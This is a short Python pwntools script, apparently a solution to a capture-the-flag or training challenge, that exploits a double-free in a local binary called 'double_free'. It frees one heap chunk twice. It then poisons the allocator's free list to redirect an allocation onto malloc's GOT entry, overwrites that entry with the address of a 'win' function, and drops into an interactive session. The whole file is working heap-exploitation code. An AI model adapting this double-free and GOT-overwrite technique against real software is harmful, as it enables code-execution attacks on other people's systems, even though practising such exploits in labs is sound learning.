from pwn import *
#context.log_level='DEBUG'

p = process("./double_free")
elf = ELF("./double_free", checksec=False)
libc = elf.libc

def edit(idx, content):
	p.sendline(b"e %d %b" % (idx, content))
	p.recvuntil("e.g, l\n")

if __name__=="__main__":

	pause()
	p.sendline("m 18") # 1
	p.sendline("f 0")
	p.sendline("f 0")
	p.sendline("m 18") # 1
	edit(1, p64(elf.got['malloc']))
	p.sendline("m 18") # 2
	p.sendline("m 18") # 3
	edit(3, p64(elf.symbols['win']))
	p.sendline("m 18")

	p.interactive()
